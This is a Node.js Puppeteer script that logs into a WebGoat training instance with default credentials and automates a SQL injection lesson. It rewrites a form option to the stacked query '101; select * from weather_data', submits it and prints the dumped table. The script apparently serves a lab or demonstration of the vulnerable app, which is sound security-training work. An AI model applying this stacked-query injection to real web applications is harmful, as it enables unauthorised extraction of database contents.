const fs = require('fs');
var alb = fs.readFileSync('./alb.url', 'utf8').replace(/\n$/,'');

const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch({
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
    ]
  });
  const url = 'http://' + alb + '/WebGoat';
  var page = await browser.newPage();
  await page.setViewport({
    width: 1920,
    height: 1080
  });
  await page.goto(url);

  /* login */
  try {
    await page.click('#exampleInputEmail1');
    await page.keyboard.type('webgoat');
    await page.click('#exampleInputPassword1');
    await page.keyboard.type('webgoat');
    await page.click('#main-content > form > button');
    await page.waitForSelector('#menu-container > ul > li:nth-child(11) > a > span');
    console.log('logged in to ' + url);

  } catch (e) {
    console.log('unable to login to ' + url);
    process.exit(1);
  }

  /* navigate to lesson & inject */
  try{
    await page.goto(url + '/start.mvc#attack/101829144/1100', {timeout: 0});
    await page.click('#restart-lesson-button'); /* reset lessson JIC */
    const STATIONS = '#lessonContent > form > p:nth-child(1) > select';
    await page.waitForSelector(STATIONS);
    await page.$eval(STATIONS, columbia => columbia.options[0].value = '101; select * from weather_data');
    const SUBMIT = '#lessonContent > form > p:nth-child(2) > input[type="SUBMIT"]';
    await page.click(SUBMIT);
    console.log('injection submitted');
    await page.waitForSelector(SUBMIT);
    const TARGET = '#lessonContent > form > table';
    await page.waitForSelector(TARGET);
    console.log('dumping target table:');
    var tbl = await page.$eval(TARGET, tbl => tbl.innerText);
    console.log(tbl);
  } catch (e)
  {
    console.log('unable to inject: ' + e);
    console.log('usually this is due to Chromium headless crashing; please retry');
  }

  await browser.close();
})();
